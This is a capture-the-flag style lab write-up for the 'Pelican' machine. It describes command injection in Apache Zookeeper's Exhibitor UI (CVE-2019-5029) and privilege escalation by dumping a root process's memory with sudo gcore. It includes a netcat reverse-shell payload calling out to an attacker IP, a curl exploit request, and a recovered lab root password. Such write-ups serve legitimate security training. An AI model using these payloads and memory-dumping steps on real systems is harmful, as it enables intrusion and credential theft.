@@ -1,0 +1,49 @@
+Pelican - Intermediate
+
+* command injection vulnerability in the Exhibitor UI for Apache Zookeeper to gain initial system access.
+* privilege escalation by using the gcore command permitted via sudo to dump the memory of a root-owned process and extract root credentials.
+
+--------------------------------------------------------------------------
+//Enumeration
+
+* No SMB shares available
+
+P2181 → zookeeper 3.4.6
+P8080 → Jetty 1.0
+P8081 → nginx 1.14.2
+
+zookeeper 3.4.6 - Remote Code Execution exploit in Exhibitor UI.
+(CVE:2019-5029)
+---------------------------------------------------------------------------
+Exploitation
+
+The steps to exploit it from a web browser:
+
+    * Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON
+
+    * In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:
+	$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
+    * Click Commit > All At Once > OK
+    * The command may take up to a minute to execute.
+    
+  OR via curl
+  	curl -X POST -d @data.json http://10.0.0.200:8080/exhibitor/v1/config/set
+  	
+ Get a reverse connection
+ 
+ ---------------------------------------------------------------------------
+ Priv Esc
+ 
+ * 'sudo -l' reveals user can run gcore as root user.
+ * It is an application for dumping information out of memory for running processes.
+ * 'ps aux' reveals intresting process /usr/bin/password-store running as root user.
+ 
+ * Dump the information using its PID
+ 	sudo gcore -o /tmp/pstore_dump 513
+ * Read the file using strings
+ 	strings /tmp/pstore_dump.513
+ * Found the root creds in the file
+ 	001 Password: root:
+	ClogKingpinInning731
+
+ 
